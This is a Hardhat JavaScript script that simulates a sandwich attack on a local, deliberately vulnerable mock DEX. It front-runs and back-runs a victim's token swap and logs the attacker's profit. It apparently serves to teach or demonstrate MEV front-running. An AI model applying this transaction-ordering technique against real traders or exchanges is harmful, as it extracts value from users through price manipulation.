const { ethers, network } = require("hardhat");

async function main() {
  // Get signers
  const [deployer, victim, attacker] = await ethers.getSigners();

  // Deploy tokens
  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const tokenA = await MockERC20.deploy("Token A", "TKA", ethers.parseEther("1000000"));
  const tokenB = await MockERC20.deploy("Token B", "TKB", ethers.parseEther("1000000"));
  await tokenA.waitForDeployment();
  await tokenB.waitForDeployment();

  // Deploy DEX
  const VulnerableDEX = await ethers.getContractFactory("VulnerableDEX");
  const dex = await VulnerableDEX.deploy(tokenA.target, tokenB.target);
  await dex.waitForDeployment();

  // Add initial liquidity (1000 TKA : 2000 TKB)
  await tokenA.approve(dex.target, ethers.parseEther("1000"));
  await tokenB.approve(dex.target, ethers.parseEther("2000"));
  await dex.addLiquidity(ethers.parseEther("1000"), ethers.parseEther("2000"));

  // Distribute tokens
  await tokenA.mint(victim.address, ethers.parseEther("500"));
  await tokenA.mint(attacker.address, ethers.parseEther("100"));
  await tokenB.mint(victim.address, ethers.parseEther("1000"));
  await tokenB.mint(attacker.address, ethers.parseEther("200"));

  // Helper to log balances and reserves
  async function logState(label) {
    const [reserveA, reserveB] = [await dex.reserveA(), await dex.reserveB()];
    const [victimA, victimB] = [await tokenA.balanceOf(victim.address), await tokenB.balanceOf(victim.address)];
    const [attackerA, attackerB] = [await tokenA.balanceOf(attacker.address), await tokenB.balanceOf(attacker.address)];
    const price = await dex.getPrice();
    console.log(`\n=== ${label} ===`);
    console.log(`Pool Reserves: ${ethers.formatEther(reserveA)} TKA, ${ethers.formatEther(reserveB)} TKB`);
    console.log(`Victim: ${ethers.formatEther(victimA)} TKA, ${ethers.formatEther(victimB)} TKB`);
    console.log(`Attacker: ${ethers.formatEther(attackerA)} TKA, ${ethers.formatEther(attackerB)} TKB`);
    console.log(`Pool Price (TKB/TKA): ${ethers.formatEther(price)}`);
  }

  // Initial state
  await logState("Initial State");

  // Victim prepares a large swap
  const victimSwapAmount = ethers.parseEther("100");
  const victimMinOut = ethers.parseEther("150"); // High slippage tolerance
  const initialVictimB = await tokenB.balanceOf(victim.address);
  const initialAttackerA = await tokenA.balanceOf(attacker.address);

  // Disable automine to simulate mempool
  await network.provider.send("evm_setAutomine", [false]);

  // Victim submits swap (TokenA -> TokenB)
  await tokenA.connect(victim).approve(dex.target, victimSwapAmount);
  const victimTx = dex.connect(victim).swapAForB(victimSwapAmount, victimMinOut);

  // Attacker detects victim's tx and frontruns
  const attackerFrontrunAmount = ethers.parseEther("50");
  await tokenA.connect(attacker).approve(dex.target, attackerFrontrunAmount);
  const attackerFrontrunTx = dex.connect(attacker).swapAForB(attackerFrontrunAmount, 0);

  // Mine block (attacker's tx first, then victim's)
  await network.provider.send("evm_mine");
  await attackerFrontrunTx;
  await victimTx;

  await logState("After Frontrun + Victim Swap");

  // Attacker backruns (TokenB -> TokenA)
  const attackerB = await tokenB.balanceOf(attacker.address);
  await tokenB.connect(attacker).approve(dex.target, attackerB);
  const attackerBackrunTx = await dex.connect(attacker).swapBForA(attackerB, 0);

  // Mine block for backrun
  await network.provider.send("evm_mine");

  await logState("After Backrun");

  // Re-enable automine
  await network.provider.send("evm_setAutomine", [true]);

  // Calculate attacker's net profit in TokenA
  const finalAttackerA = await tokenA.balanceOf(attacker.address);
  const profit = finalAttackerA - initialAttackerA;
  console.log(`\nAttacker's net profit: ${ethers.formatEther(profit)} TKA`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
}); 